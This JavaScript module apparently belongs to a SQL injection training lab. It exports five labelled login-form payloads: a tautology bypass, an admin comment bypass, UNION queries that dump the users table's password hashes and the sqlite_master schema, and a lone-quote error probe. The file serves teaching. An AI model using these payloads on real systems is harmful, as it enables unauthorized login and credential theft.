/** Classic SQL injection payloads for the login lab (typed into the USERNAME field). */
const Q = "\u0027"; // single quote

export const PAYLOADS = [
  {
    id: "tautology",
    label: "Tautology bypass",
    value: `${Q} OR 1=1 --`,
    desc: "WHERE becomes always-true and the password check is commented out. Logs in as the first user (admin).",
  },
  {
    id: "comment",
    label: "Target a user",
    value: `admin${Q} --`,
    desc: "Closes the username string and comments out the password comparison.",
  },
  {
    id: "union-users",
    label: "UNION credential dump",
    value: `${Q} UNION SELECT id, username, role, password_hash FROM users --`,
    desc: "Appends every row of the users table, leaking all SHA-512 hashes.",
  },
  {
    id: "union-schema",
    label: "Schema enumeration",
    value: `${Q} UNION SELECT 0, name, type, sql FROM sqlite_master --`,
    desc: "Reads the database schema from sqlite_master. No real account maps to it, but the data still leaks.",
  },
  {
    id: "error",
    label: "Error-based probe",
    value: Q,
    desc: "A lone quote breaks the syntax; the verbose error reveals query structure.",
  },
];
